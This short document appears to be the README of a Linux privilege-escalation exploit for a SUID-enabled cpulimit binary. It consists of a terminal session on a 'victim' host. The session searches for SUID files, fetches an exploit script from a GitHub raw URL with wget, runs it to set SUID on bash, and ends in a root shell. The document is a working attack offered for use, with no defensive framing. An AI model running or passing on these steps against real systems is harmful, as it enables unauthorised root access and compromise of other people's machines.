# CPULimit Linux Privilege Escalation

```bash
user@victim:~$ whoami
user
user@victim:~$ find / -perm -4000 2>/dev/null
/usr/bin/cpulimit
user@victim:~$ cd /tmp
user@victim:~$ wget https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
user@victim:~$ chmod +x suid_root.sh
user@victim:~$ ./suid_root.sh

[i]  starting exploit.. 
[*]  check PATH bash: /usr/bin/bash
[*]  check PATH cpulimit: /usr/bin/cpulimit
[i]  granting SUID permissions to: /usr/bin/bash
Process 637 detected
Child process is finished, exiting...
[i]  getting a shell as root.. 
bash-5.0# whoami
root
```
